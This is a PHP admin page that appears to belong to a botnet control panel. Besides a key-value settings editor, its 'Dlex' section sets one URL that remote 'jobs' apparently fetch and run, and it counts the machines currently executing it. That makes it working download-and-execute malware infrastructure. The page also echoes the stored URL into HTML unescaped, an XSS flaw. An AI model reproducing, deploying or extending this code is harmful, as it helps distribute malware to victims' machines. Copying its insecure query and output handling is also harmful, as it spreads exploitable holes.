<?php
if (!defined('AUTHED') || !AUTHED)
	die('no direct xs');

if (isset($_POST['submit'])) {
	if ($_POST['submit'] === 'Add') {
		$k = mysql_real_escape_string($_POST['sk']);
		$v = mysql_real_escape_string($_POST['sv']);
		$sql = "INSERT INTO settings(skey, sval) VALUES('$k', '$v')";

		if (mysql_query($sql) === true)
			print "Added new setting successfully<br />";
		else
			print "Adding new setting failed.<br />";
	} else if ($_POST['submit'] === 'Save') 
		foreach ($_POST as $k => $v) {
			if (substr($k, 0, 3) === 'sv_') {
				$n = intval(substr($k, 3));
				if (!isset($_POST["dl_$n"])) {
					$v = mysql_real_escape_string($v);
					mysql_query("UPDATE settings SET sval='$v' WHERE id='$n' LIMIT 1");
				} else
					mysql_query("DELETE FROM settings WHERE id='$n' LIMIT 1");
			}
		}
	else if ($_POST['submit'] === 'Set') {
		mysql_query("DELETE FROM jobs");
		mysql_query("DELETE FROM dl");
		$url = mysql_real_escape_string($_POST["url"]);
		mysql_query("INSERT INTO dl(url) VALUES('$url')");
	} else if ($_POST['submit'] === 'Delete') {
		mysql_query("DELETE FROM jobs");
		mysql_query("DELETE FROM dl");
	}
}

$sql = "SELECT * FROM settings";
$res = mysql_query($sql);

print '<form action="#save" method="POST"><table><tr><td>Key</td><td>Value</td><td>Delete?</td></tr>';
while ($row = mysql_fetch_assoc($res)) {
	print "<tr><td>" . htmlentities($row['skey']) . "</td><td><input style='width:300px;margin:10px;' type='text' name='sv_$row[id]' value='" .
		htmlentities($row['sval'], ENT_QUOTES) . "' /></td><td><input type='checkbox' name='dl_$row[id]' /></tr>";
}
print '</table><input type="submit" name="submit" value="Save" /></form>';

print '<form action="" method="POST">' .
	'<input type="text" value="name" name="sk" />' .
	'<input type="text" value="val" name="sv" />' .
	'<br /><input type="submit" name="submit" value="Add" /></form>';

$url = @mysql_fetch_array(mysql_query("SELECT url FROM dl LIMIT 1"))[0];
$cnt = @mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM jobs"))[0];

if (!strlen($url))
	$url = "http://...";
	
print '<h2>Dlex</h2><br /><br />'.
	'<form action="" method="POST">' .
	'<input type="text" value="' . $url . '" name="url" /> Currently executed by ' . $cnt .
	'<br /><input type="submit" name="submit" value="Set" /><input type="submit" name="submit" value="Delete" /></form>';
?>
